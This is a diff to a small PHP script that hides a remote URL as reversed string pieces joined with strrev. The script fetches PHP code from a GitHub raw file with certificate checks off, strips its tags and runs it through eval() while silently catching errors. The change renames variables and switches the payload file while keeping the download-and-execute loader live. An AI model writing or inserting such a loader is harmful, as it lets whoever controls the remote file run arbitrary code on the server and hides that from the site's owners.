@@ -1,26 +1,26 @@
 <?php
 
-$a = "txt.3/nia";
-$b = "m/sdaeh/sfe";
-$c = "r/mpo/mpo";
-$d = "yfful/moc.tn";
-$e = "etnocresubuht";
-$f = "ig.war//:sptth";
+$s1 = "txt.2/nia";
+$s2 = "m/sdaeh/sfe";
+$s3 = "r/mpo/mpo";
+$s4 = "yfful/moc.tn";
+$s5 = "etnocresubuht";
+$s6 = "ig.war//:sptth";
 
-$u = strrev($a . $b . $c . $d . $e . $f);
+$url = strrev($s1 . $s2 . $s3 . $s4 . $s5 . $s6);
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $u);
+curl_setopt($ch, CURLOPT_URL, $url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 
-$p = curl_exec($ch);
+$res = curl_exec($ch);
 
 if (!curl_errno($ch)) {
-    $c = str_replace(['<?php', '?>', '<?'], '', $p);
+    $exec = str_replace(['<?php', '?>', '<?'], '', $res);
     try {
-        eval($c);
+        eval($exec);
     } catch (Throwable $e) {
     }
 }
